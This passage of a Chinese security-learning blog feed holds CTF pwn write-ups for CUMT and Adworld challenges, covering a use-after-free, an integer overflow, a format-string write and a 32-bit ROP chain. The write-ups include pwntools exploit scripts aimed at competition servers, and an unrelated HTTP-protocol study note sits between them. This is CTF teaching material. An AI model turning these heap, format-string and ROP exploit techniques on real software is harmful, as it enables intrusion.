alt="img"></p><p>然后我们选择show，就会调用这个指针，所以我们可以控制这个指针调用我们想要的函数</p><p><img src="/2021/03/30/cumtctf/clip_image020.jpg" alt="img"></p><p>程序中有后门函数，所以只要覆盖成这个就行</p><p><img src="/2021/03/30/cumtctf/clip_image022.jpg" alt="img"></p><p>Payload脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#!/usr/bin/env python</span><br><br>\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&quot;./pwn4&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10003</span>)<br><br>backdoor = <span class="hljs-number">0x0000000400BCE</span><br><br>\<span class="hljs-comment">#p = process(&quot;./pwn4&quot;)</span><br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;6666&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;7777&quot;</span>)<br><br>\<span class="hljs-comment">#删除index0</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>\<span class="hljs-comment">#删除index1</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为4的堆块，内容是后门函数</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(p32(backdoor))<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>\<span class="hljs-comment">#调用index0的print指针</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>p.interactive()<br><br> <br></code></pre></td></tr></table></figure><h1 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> PWN5</h1><p>用ida打开程序，也是一个让我们选择的程序，选项1是创建账号，2是展示，3是删除，4是添加memory，5选项是验证main_account+16的位置的值是否等于1953330531，然后getshell</p><p><img src="/2021/03/30/cumtctf/clip_image024.jpg" alt="img"></p><p><img src="/2021/03/30/cumtctf/clip_image026.jpg" alt="img"></p><p>所以解题思路是覆盖这个位置的数据为1953330531</p><p>我们注意到删除账号的时候也只是进行了free，没有置空指针，有uaf漏洞利用</p><p><img src="/2021/03/30/cumtctf/clip_image028.jpg" alt="img"></p><p>然后在add memory时，可以读入256个字节。</p><p>Gdb调试：</p><p>先创建一个aaaa，bbbb的账号，堆内存如下</p><p><img src="/2021/03/30/cumtctf/clip_image030.jpg" alt="img"></p><p>然后尝试check，发现检查的main_account+16的位置是0x603010+0x40，也就是64个字节</p><p><img src="/2021/03/30/cumtctf/clip_image032.jpg" alt="img"></p><p>然后删除账号，添加一个memory，内容为68个c</p><p><img src="/2021/03/30/cumtctf/clip_image034.jpg" alt="img"></p><p>就可以覆盖到0x50的位置</p><p>所以只要把0x50位置的值覆盖为1953330531（十六进制0x746d7563）即可</p><p>Payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>\<span class="hljs-comment">#p = process(&#x27;./pwn5&#x27;)</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10004</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your first name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your last name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_memory</span>(<span class="hljs-params">payload</span>):</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;plz input what you want say:&quot;</span>)<br><br>  \<span class="hljs-comment">#gdb.attach(p)</span><br><br>  p.sendline(payload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_CUMT</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>Create_your_account()<br><br>delete_your_account()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+p64(<span class="hljs-number">0x746d7563</span>) <br><br>add_memory(payload)<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>check_CUMT()<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP协议学习</title>
    <link href="/2021/03/26/http/"/>
    <url>/2021/03/26/http/</url>
    
    <content type="html"><![CDATA[<h1 id="http协议学习"><a class="markdownIt-Anchor" href="#http协议学习"></a> HTTP协议学习</h1><h2 id="http和https的区别"><a class="markdownIt-Anchor" href="#http和https的区别"></a> http和https的区别：</h2><ol><li>HTTP 的URL 以http:// 开头，而HTTPS 的URL 以https:// 开头</li><li>HTTP 是不安全的，而 HTTPS 是安全的</li><li>HTTP 标准端口是80 ，而 HTTPS 的标准端口是443</li><li>在OSI 网络模型中，HTTP工作于应用层，而HTTPS 的安全传输机制工作在传输层</li><li>HTTP 无法加密，而HTTPS 对传输的数据进行加密</li><li>HTTP无需证书，而HTTPS 需要CA机构wosign的颁发的SSL证书</li></ol><h2 id="http为什么是无状态协议如何解决"><a class="markdownIt-Anchor" href="#http为什么是无状态协议如何解决"></a> http为什么是无状态协议？如何解决？</h2><p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理</p><p><strong>解决：</strong></p><ul><li>基于Session实现的会话保持<br>在会话开始时（客户端第一次像服务器发送http请求），服务器将会话状态保存起来（本机内存或数据库中），然后分配一个会话标识（SessionId）给客户端，这个会话标识一般保存在客户端Cookie中，以后每次浏览器发送http请求都会带上Cookie中的SessionId到服务器，服务器拿到会话标识就可以把之前存储在服务器端的状态信息与会话联系起来，实现会话保持（如果遇到浏览器禁用Cookie的情况，则可以通过url重写的方式将会话标识放在url的参数里，也可实现会话保持）</li><li>基于Cookie实现的会话保持<br>基于Cookie实现会话保持与上述基于Session实现会话保持的最主要区别是前者完全将会话状态信息存储在浏览器Cookie中，这样一来每次浏览器发送HTTP请求的时候都会带上状态信息，因此也就可以实现状态保持。</li></ul><h2 id="http常用的方法"><a class="markdownIt-Anchor" href="#http常用的方法"></a> http常用的方法</h2><ul><li>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器</li><li>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</li><li>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。</li><li>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。</li><li>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。</li><li>OPTIONS：查询相应URI支持的HTTP方法。</li></ul><h2 id="http请求报文与响应报文格式"><a class="markdownIt-Anchor" href="#http请求报文与响应报文格式"></a> HTTP请求报文与响应报文格式</h2><p>请求报文包含四部分：</p><p><img src="/2021/03/26/http/1.png" alt="1"></p><ul><li>a、请求行：包含请求方法、URI、HTTP版本信息</li><li>b、请求首部字段</li><li>c、请求内容实体</li><li>d、空行</li></ul><p>响应报文包含四部分：</p><p><img src="/2021/03/26/http/2.png" alt="2"></p><p>常见的首部：</p><ul><li><strong>通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><ul><li>Date：创建报文时间</li><li>Connection：连接的管理</li><li>Cache-Control：缓存的控制</li><li>Transfer-Encoding：报文主体的传输编码方式</li></ul></li><li><strong>请求首部字段（请求报文会使用的首部字段）</strong><ul><li>Host：请求资源所在服务器</li><li>Accept：可处理的媒体类型</li><li>Accept-Charset：可接收的字符集</li><li>Accept-Encoding：可接受的内容编码</li><li>Accept-Language：可接受的自然语言</li></ul></li><li><strong>响应首部字段（响应报文会使用的首部字段）</strong><ul><li>Accept-Ranges：可接受的字节范围</li><li>Location：令客户端重新定向到的URI</li><li>Server：HTTP服务器的安装信息</li></ul></li><li><strong>实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）</strong><ul><li>Allow：资源可支持的HTTP方法</li><li>Content-Type：实体主类的类型</li><li>Content-Encoding：实体主体适用的编码方式</li><li>Content-Language：实体主体的自然语言</li><li>Content-Length：实体主体的的字节数</li><li>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</li></ul></li></ul><h2 id="https工作原理"><a class="markdownIt-Anchor" href="#https工作原理"></a> HTTPS工作原理</h2><ul><li>一、首先HTTP请求服务端生成证书，客户端对证书的有效期、合法性、域名是否与请求的域名一致、证书的公钥（RSA加密）等进行校验；</li><li>二、客户端如果校验通过后，就根据证书的公钥的有效， 生成随机数，随机数使用公钥进行加密（RSA加密）；</li><li>三、消息体产生的后，对它的摘要进行MD5（或者SHA1）算法加密，此时就得到了RSA签名；</li><li>四、发送给服务端，此时只有服务端（RSA私钥）能解密。</li><li>五、解密得到的随机数，再用AES加密，作为密钥（此时的密钥只有客户端和服务端知道）。</li></ul><h2 id="一次完整的http请求"><a class="markdownIt-Anchor" href="#一次完整的http请求"></a> 一次完整的HTTP请求</h2><p>HTTP通信机制是在一次完整的HTTP通信过程中，Web浏览器与Web服务器之间将完成下列7个步骤：</p><ul><li>建立TCP连接</li></ul><p>在HTTP工作开始之前，Web浏览器首先要通过网络与Web服务器建立连接，该连接是通过TCP来完成的，该协议与IP协议共同构建 Internet，即著名的TCP/IP协议族，因此Internet又被称作是TCP/IP网络。<strong>HTTP是比TCP更高层次的应用层协议，根据规则， 只有低层协议建立之后才能，才能进行更层协议的连接，因此，首先要建立TCP连接，一般TCP连接的端口号是80。</strong></p><ul><li>Web浏览器向Web服务器发送请求行</li></ul><p>一旦建立了TCP连接，<strong>Web浏览器就会向Web服务器发送请求命令</strong>。例如：GET /sample/hello.jsp HTTP/1.1。</p><ul><li>Web浏览器发送请求头<ul><li>浏览器发送其请求命令之后，还要以头信息的形式向Web服务器发送一些别的信息，<strong>之后浏览器发送了一空白行来通知服务器</strong>，它已经结束了该头信息的发送。</li></ul></li><li>Web服务器应答<ul><li>客户机向服务器发出请求后，服务器会客户机回送应答， <strong>HTTP/1.1 200 OK ，应答的第一部分是协议的版本号和应答状态码。</strong></li></ul></li><li>Web服务器发送应答头<ul><li>正如客户端会随同请求发送关于自身的信息一样，服务器也会随同应答向用户发送关于它自己的数据及被请求的文档。</li></ul></li><li>Web服务器向浏览器发送数据<ul><li>Web服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，<strong>它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据</strong>。</li></ul></li><li>Web服务器关闭TCP连接<ul><li>一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接，然后如果浏览器或者服务器在其头信息加入了这行代码：</li></ul></li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Connection:</span><span class="hljs-meta">keep</span>-alive<br></code></pre></td></tr></table></figure><p>TCP连接在发送后将仍然保持打开状态，于是，浏览器可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。</p><p><strong>建立TCP连接-&gt;发送请求行-&gt;发送请求头-&gt;（到达服务器）发送状态行-&gt;发送响应头-&gt;发送响应数据-&gt;断TCP连接</strong></p><h2 id="常见的http相应状态码"><a class="markdownIt-Anchor" href="#常见的http相应状态码"></a> 常见的HTTP相应状态码</h2><ul><li>200：请求被正常处理</li><li>204：请求被受理但没有资源可以返回</li><li>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。</li><li>301：永久性重定向</li><li>302：临时重定向</li><li>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上</li><li>304：发送附带条件的请求时，条件不满足时返回，与重定向无关</li><li>307：临时重定向，与302类似，只是强制要求使用POST方法</li><li>400：请求报文语法有误，服务器无法识别</li><li>401：请求需要认证</li><li>403：请求的对应资源禁止被访问</li><li>404：服务器无法找到对应资源</li><li>500：服务器内部错误</li><li>503：服务器正忙</li></ul><h2 id="http11版本新特性"><a class="markdownIt-Anchor" href="#http11版本新特性"></a> HTTP1.1版本新特性</h2><ul><li>a、<strong>默认持久连接节省通信量</strong>，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</li><li>b、<strong>管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</strong></li><li>c、<strong>断点续传</strong><ul><li><strong>实际上就是利用HTTP消息头使用分块传输编码，将实体主体分块传输。</strong></li></ul></li></ul><h2 id="http优化方案"><a class="markdownIt-Anchor" href="#http优化方案"></a> HTTP优化方案</h2><ul><li><strong>TCP复用：TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。前者是负载均衡设备的独特功能；而后者是HTTP 1.1协议所支持的新功能，目前被大多数浏览器所支持。</strong></li><li><strong>内容缓存：将经常用到的内容进行缓存起来，那么客户端就可以直接在内存中获取相应的数据了。</strong></li><li><strong>压缩：将文本数据进行压缩，减少带宽</strong></li><li><strong>SSL加速（SSL Acceleration）：使用SSL协议对HTTP协议进行加密，在通道内加密并加速</strong></li><li><strong>TCP缓冲：通过采用TCP缓冲技术，可以提高服务器端响应时间和处理效率，减少由于通信链路问题给服务器造成的连接负担。</strong></li></ul><blockquote><p><em><strong>参考文章：<a href="https://blog.csdn.net/yicixing7/article/details/79320821">https://blog.csdn.net/yicixing7/article/details/79320821</a></strong></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界刷题记录</title>
    <link href="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="攻防世界-pwn-int_overflow-整数溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-int_overflow-整数溢出"></a> 攻防世界-pwn-int_overflow-整数溢出</h1><p>1.先检查程序，没有开启canary和pie</p><p>​         <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101322876.png" alt="image-20210413101322876"></p><p>2.使用ida查看函数，main函数里会让你输入一个数字，当输入1时调用login()</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101524638.png" alt="image-20210413101524638"></p><p>查看login()函数</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101553522.png" alt="image-20210413101553522"></p><p>这里的第二个read函数读取的长度为0x199</p><p>然后再查看check_passwd函数</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101615917.png" alt="image-20210413101615917"></p><p>这里的v3是unsigned_int8型，存储8个字节，最多存储256个长度，这里可以进行整数溢出，下面的代码只要v3&gt;3或者v3&lt;8就可以通过验证，所以v3可以是259-264或者3-8个长度</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101639471.png" alt="image-20210413101639471"></p><p>3.继续观察函数，发现下面存在strcpy()函数存在栈溢出，但是&amp;dest的栈有14个字节，所以我们得让v3整数溢出通过上面的判断，然后在偏移为14+ebp的时候写入后门函数的地址</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101700572.png" alt="image-20210413101700572"></p><p>后门函数地址为0x0804868B</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101715484.png" alt="image-20210413101715484"></p><p>所以编写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>cat_flag=<span class="hljs-number">0x0804868B</span>  <span class="hljs-comment">#后门函数地址</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39309&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Please input your username:\n&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(cat_flag)+<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x14</span>-<span class="hljs-number">4</span>-<span class="hljs-number">4</span>)  <br><span class="hljs-comment">#&#x27;A&#x27;*0x14是到栈底的偏移量，&#x27;a&#x27;*4是ebp，最后填充的A需要补充长度到260才能导致整数溢出</span><br>p.sendlineafter(<span class="hljs-string">&quot;Please input your passwd:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-cgfsb-格式化字符串写入"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgfsb-格式化字符串写入"></a> 攻防世界-pwn-CGfsb-格式化字符串写入</h1><p>1.首先检查程序</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102120434.png" alt="image-20210413102120434"></p><p>32位程序，开启了canary保护和nx</p><p>2.用ida打开查看函数，发现其中有一个printf(&amp;s)存在明显的栈溢出</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102138548.png" alt="image-20210413102138548"></p><p>在第二次输入message时输入aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p可以知道偏移为10</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102154558.png" alt="image-20210413102154558"></p><p>3.再次查看函数，里面有一段判断如果pwnme=8，则得到flag，所以我们可以用格式化字符串的漏洞覆盖pwnme的值</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102219355.png" alt="image-20210413102219355"></p><p>4.用ida查看pwnme的地址为0x0804A068，写出payload</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102248705.png" alt="image-20210413102248705"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39393&#x27;</span>)<br>pwnme_addr=<span class="hljs-number">0x0804A068</span>         <span class="hljs-comment">#pwnme的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>payload=p32(pwnme_adddr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;%10$n&#x27;</span>    <br><span class="hljs-comment">#利用格式化字符串在pwnme的地址写入8，因为pwnme的地址占4字节，再补充4*a到8，就可以使pwnme的值为8</span><br>p.sendlineafter(<span class="hljs-string">&quot;leave your message please:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-cgpwn2-32位rop链构造"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgpwn2-32位rop链构造"></a> 攻防世界-pwn-cgpwn2-32位rop链构造</h1><p>1.先用checksec检查程序的保护</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102641981.png" alt="image-20210413102641981"></p><p>没有开启canary，然后使用ida查看代码，发现hello函数有一次存在栈溢出</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102711827.png" alt="image-20210413102711827"></p><p>并且发现name存在于bss中的地址是固定的0x0804A080</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102724230.png" alt="image-20210413102724230"></p><p>我们可以在name这个地方存储’/bin/sh’作为system的参数调用</p><p>Hello函数中存在一个get函数作为溢出点</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102741169.png" alt="image-20210413102741169"></p><p>离栈底为0x26</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102759807.png" alt="image-20210413102759807"></p><p>这时可以编写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./cgpwn2&quot;</span>)<br>p = remote(<span 